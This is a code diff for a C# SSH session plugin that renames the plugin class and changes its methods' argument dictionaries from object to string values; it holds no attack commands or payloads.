@@ -4,12 +4,12 @@ using System.Text;
 
 namespace Plugins
 {
-    public class Plugin : AthenaPlugin
+    public class Ssh : AthenaPlugin
     {
         public override string Name => "ssh";
         Dictionary<string, SshClient> sessions = new Dictionary<string, SshClient>();
         string currentSession = "";
-        public override void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, string> args)
         {
             try
             {
@@ -71,7 +71,7 @@ namespace Plugins
                 return;
             }
         }
-        ResponseResult Connect(Dictionary<string, object> args)
+        ResponseResult Connect(Dictionary<string, string> args)
         {
             ConnectionInfo connectionInfo;
             string hostname = (string)args["hostname"];
@@ -144,7 +144,7 @@ namespace Plugins
             }
 
         }
-        ResponseResult Disconnect(Dictionary<string, object> args)
+        ResponseResult Disconnect(Dictionary<string, string> args)
         {
             string session;
             if (String.IsNullOrEmpty((string)args["session"]))
@@ -201,7 +201,7 @@ namespace Plugins
                 };
             }
         }
-        ResponseResult RunCommand(Dictionary<string, object> args)
+        ResponseResult RunCommand(Dictionary<string, string> args)
         {
             StringBuilder sb = new StringBuilder();
             string command = (string)args["command"];
@@ -249,7 +249,7 @@ namespace Plugins
                 task_id = (string)args["task-id"]
             };
         }
-        ResponseResult ListSessions(Dictionary<string, object> args)
+        ResponseResult ListSessions(Dictionary<string, string> args)
         {
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("Active Sessions");
